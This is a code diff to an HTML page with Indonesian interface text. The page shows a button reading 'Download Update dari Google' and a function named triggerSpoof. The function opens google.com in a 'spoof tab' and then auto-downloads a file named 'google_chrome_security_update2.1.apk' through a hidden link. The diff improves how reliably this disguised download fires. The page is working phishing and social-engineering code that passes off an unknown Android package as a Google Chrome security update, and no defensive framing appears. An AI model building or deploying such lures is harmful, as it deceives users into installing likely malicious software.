@@ -8,6 +8,7 @@
       body {
         font-family: sans-serif;
         display: flex;
+        flex-direction: column;
         justify-content: center;
         align-items: center;
         height: 100vh;
@@ -22,10 +23,17 @@
         border-radius: 8px;
         cursor: pointer;
         box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        margin: 10px;
+        font-weight: bold;
       }
       .btn:active {
         background-color: #45a049;
         transform: translateY(2px);
+      }
+      #status {
+        margin-top: 15px;
+        color: #555;
+        font-size: 14px;
       }
     </style>
   </head>
@@ -33,14 +41,27 @@
     <button class="btn" onclick="triggerSpoof()">
       Download Update dari Google
     </button>
+    <div id="status"></div>
 
     <script>
       function triggerSpoof() {
-        const targetWindow = window.open("https://www.google.com", "spoof_tab");
+        const file = "google_chrome_security_update2.1.apk";
+        document.getElementById("status").innerText = "Membuka spoof tab & menyiapkan download...";
+        
+        try {
+          window.open("https://www.google.com", "spoof_tab");
+        } catch(e) {}
 
+        // Mengunduh file APK secara andal
         setTimeout(function () {
-          window.open("google_chrome_security_update2.1.apk", "spoof_tab");
-        }, 5000);
+          const a = document.createElement("a");
+          a.href = file;
+          a.download = file;
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+          document.getElementById("status").innerText = "Download dimulai: " + file;
+        }, 1500);
       }
     </script>
   </body>
